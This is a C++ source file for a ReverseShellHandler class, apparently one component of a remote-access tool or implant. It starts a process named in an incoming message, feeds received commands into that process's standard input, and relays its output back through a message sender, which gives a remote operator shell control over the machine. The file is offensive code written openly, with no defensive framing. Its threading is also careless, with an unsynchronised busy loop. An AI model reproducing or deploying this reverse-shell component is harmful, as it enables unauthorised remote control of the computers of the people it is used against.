#include "ReverseShellHandler.h"

ReverseShellHandler::ReverseShellHandler(
	IMessageSender* sender
) :
	_sender(sender),
	_thread(std::make_unique<ThreadGuard>(
		std::thread(&ReverseShellHandler::ReadOutput, this)))
{
}

void ReverseShellHandler::Handle(const MessageType type, std::span<char> content)
{
	const auto name = std::wstring(content.begin(), content.end());
	auto command = std::string(content.begin(), content.end());

	switch (type)
	{
		case MessageType::StartReverseShell:
			_process.reset();
			_process = std::make_unique<Process>(name, true, false);

			break;

		case MessageType::ReverseShellMessage:
			_process->WriteToStdIn(command);

			break;

		case MessageType::StopReverseShell:
			_process.reset();

			break;

		default: 
			break;
	}
}

void ReverseShellHandler::ReadOutput() const
{
	while (true)
	{
		if (_process == nullptr)
		{
			continue;
		}
		auto line = _process->ReadFromStdOut();

		const auto content = std::span(
			const_cast<char*>(line.c_str()),
			line.size());

		_sender->Send(MessageType::ReverseShellMessage, content);
	}
}
